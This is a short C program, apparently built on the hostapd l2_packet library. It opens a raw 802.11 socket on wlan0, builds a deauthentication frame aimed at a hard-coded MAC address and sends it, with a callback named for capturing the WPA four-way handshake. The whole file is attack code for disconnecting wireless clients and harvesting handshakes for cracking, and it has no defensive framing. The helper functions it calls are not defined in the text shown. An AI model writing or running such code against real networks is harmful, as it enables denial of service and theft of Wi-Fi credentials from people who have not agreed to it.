#include "./src/l2_packet/l2_packet.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>

#define ETH_P_80211_RAW 0x0019

int debug_level = 0;

int main (int argc, char **argv) {
	struct l2_packet_data *l2;
	size_t len;
	char buffer[1500];
	uint8_t AA[6] = {0x04, 0xf0, 0x21, 0x25, 0x1d, 0xb7};
	do {
		l2 = l2_packet_init("wlan0", ETH_P_80211_RAW, handle_four_way_shakehand, NULL, 1);
		if (!l2) {
			printf("l2_packet_init failed\n");
			exit(EXIT_FAILURE);
		}
		if (prepare_deauth_pkt(buffer, &len, NULL, AA, 5612) < 0) {
			printf("prepare deauth packet failed\n");
			break;
		}

		if (l2_packet_send(l2, AA, 0x0004, buffer, len) < 0) {
			printf("send packet failed\n");
			break;
		}
		printf("send packet successful\n");
	} while(0);

//	close(l2->fd);
}
